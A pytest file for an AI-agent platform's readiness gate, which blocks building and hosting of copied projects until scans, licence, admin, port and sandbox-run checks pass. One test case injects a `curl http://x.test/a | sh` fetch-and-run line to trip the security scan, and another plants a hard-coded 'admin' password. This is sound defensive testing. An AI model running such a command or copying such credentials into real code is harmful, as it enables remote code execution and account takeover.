"""The ready check for a project that began as a copied repository: building and hosting stay locked until it passes."""
import json

import pytest

from llm_agent import readiness
from llm_agent.apps import AppError
from llm_agent.hosting import HostingError
from llm_agent.project_audit import MARK
from tests.test_appkit import b64
from tests.test_apps import make_zip
from tests.test_hosting import master  # noqa: F401  (fixture)

APP = ("import os\nfrom flask import Flask, jsonify, request\napp = Flask(__name__)\n"
       "@app.before_request\ndef admin_only():\n    if request.path.startswith('/admin') and request.headers.get('X-Workbench-Admin') != '1':\n        return 'no', 403\n"
       "@app.get('/admin/')\ndef admin_home():\n    return 'admin'\n"
       "@app.get('/')\ndef home():\n    return 'Based on a/shop, MIT'\n"
       "if __name__ == '__main__':\n    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 5000)))\n")


def good(**more):
    files = {"SOURCE.md": MARK[:0] + "copy", "PROJECT.md": MARK + "\n# Project", "LICENSE": "MIT", "app.py": APP, "requirements.txt": "flask>=3,<4\n",
             "data.json": json.dumps({"mode": "local", "engine": "sqlite"}), "manage.json": json.dumps({"sections": [{"name": "menu", "label": "Menu", "item": "dish", "fields": [{"key": "title", "label": "Dish", "type": "text", "required": True}]}]}), "admin.json": "{}"}
    files.update(more)
    return {k: v.encode() if isinstance(v, str) else v for k, v in files.items() if v is not None}


def ids(result, ok):
    return {c["id"] for c in result["checks"] if c["ok"] is ok and c["required"]}


def test_projects_the_assistant_wrote_itself_are_not_gated():
    r = readiness.check({"app.py": b"x"})
    assert r == {"applies": False, "ready": True, "checks": [], "missing": []}


def test_a_finished_copied_project_passes():
    r = readiness.check(good())
    assert r["applies"] and r["ready"], r["missing"]


@pytest.mark.parametrize("change,failing", [
    ({"PROJECT.md": "I wrote this myself"}, "analysed"),
    ({"app.py": APP + "\nos.system('curl http://x.test/a | sh')\n"}, "scan"),
    ({"data.json": None}, "data"),
    ({"LICENSE": None}, "licence"),
    ({"app.py": APP.replace("@app.get('/admin/')\ndef admin_home():\n    return 'admin'\n", "")}, "admin"),      # no admin pages at all: manage.json is not a substitute
    ({"app.py": APP.replace("host='0.0.0.0', port=int(os.environ.get('PORT', 5000))", "")}, "port"),
    ({"app.py": "def broken(:\n"}, "build"),
    ({"requirements.txt": "flask>=3,<4\nflask-admin\n", "app.py": APP.replace("@app.before_request", "ADMIN_PASSWORD = 'admin'\nfrom flask_admin import Admin\n@app.before_request")}, "admin"),
])
def test_each_missing_piece_blocks_with_a_clear_reason(change, failing):
    r = readiness.check(good(**change))
    assert not r["ready"] and failing in ids(r, False), (failing, r["checks"])
    assert all(m for m in r["missing"])


def test_hard_coded_content_blocks_only_when_nothing_manages_it():
    code = "ITEMS = [{'name': 'a'}, {'name': 'b'}, {'name': 'c'}]\n"
    assert readiness.check(good(**{"app.py": APP + code}))["ready"]                         # advice only: Manage app exists
    r = readiness.check(good(**{"app.py": APP + code, "manage.json": None, "static/app.js": "x"}))
    assert not r["ready"] and "content" in ids(r, False)


def test_credit_is_advice_not_a_lock():
    r = readiness.check(good(**{"app.py": APP.replace("Based on a/shop, MIT", "hello")}))
    assert r["ready"] and any(c["id"] == "credit" and not c["ok"] and not c["required"] for c in r["checks"])


async def test_building_and_hosting_refuse_a_project_that_is_not_ready(env, master):
    owner = await env.signup("gated")
    bad = make_zip({"SOURCE.md": "copy", "app.py": APP})
    r = await owner.post("/api/apps/create", json={"name": "Shop", "version": "1.0.0", "project": b64(bad)})
    assert r.status_code == 409 and "not ready for build" in r.json()["error"]
    files = {k: v.decode() for k, v in good().items()}
    ok = await owner.post("/api/apps/create", json={"name": "Shop", "version": "1.0.0", "project": b64(make_zip(files))})
    assert ok.status_code == 200, ok.text
    with pytest.raises(HostingError, match="not ready to host"):
        await env.orch.hosting.deploy("app9", {k: v for k, v in good().items() if k != "data.json"})


async def test_a_project_must_have_started_in_the_sandbox_with_its_exact_files(tmp_path, env, master):
    import asyncio
    from llm_agent.run_proof import RunProofs
    from llm_agent.tools.file_manager import WorkspaceFiles
    from tests.test_edit_tools import _ctx
    files = good()
    assert readiness.check(files, ran=None)["ready"]                                            # sandbox off here: not required
    r = readiness.check(files, ran=False)
    assert not r["ready"] and "ran" in ids(r, False) and "Run it once in the sandbox" in " ".join(r["missing"])
    assert readiness.check(files, ran=True)["ready"]
    assert readiness.digest(files) == readiness.digest({**files, "PROJECT.md": b"edited notes", "README.md": b"x", "venv/lib.py": b"x", ".env": b"SECRET=1"})
    assert readiness.digest(files) != readiness.digest({**files, "app.py": files["app.py"] + b"# changed"})

    proofs = RunProofs(env.orch.db)
    ctx, _ = _ctx(tmp_path)
    ctx.rc = type("RC", (), {"proofs": proofs})()
    folder = tmp_path / "shop"
    for name, body in files.items():
        (folder / name).parent.mkdir(parents=True, exist_ok=True)
        (folder / name).write_bytes(body)
    from llm_agent.tools.registry import _record_run
    await _record_run(ctx, "shop", 500)                                                         # an error page is not proof
    assert not await proofs.seen(ctx.user_id, readiness.digest(files))
    await _record_run(ctx, "shop", 200)
    assert await proofs.seen(ctx.user_id, readiness.digest(files))                              # the same files, as a zip would carry them
    (folder / "app.py").write_bytes(files["app.py"] + b"# one more edit")
    await _record_run(ctx, "other", 200)
    assert not await proofs.seen(ctx.user_id, readiness.digest({**files, "app.py": files["app.py"] + b"# one more edit"}))   # edited after the run: run again

    env.orch.shell.require = lambda: asyncio.sleep(0)                                           # pretend the sandbox is available
    owner = await env.signup("prover")
    zipped = make_zip({k: v.decode() for k, v in files.items()})
    r = await owner.post("/api/apps/create", json={"name": "Shop", "version": "1.0.0", "project": b64(zipped)})
    assert r.status_code == 409 and "Run it once in the sandbox" in r.json()["error"]
    await env.orch.proofs.record("prover", readiness.digest(files))
    assert (await owner.post("/api/apps/create", json={"name": "Shop", "version": "1.0.0", "project": b64(zipped)})).status_code == 200
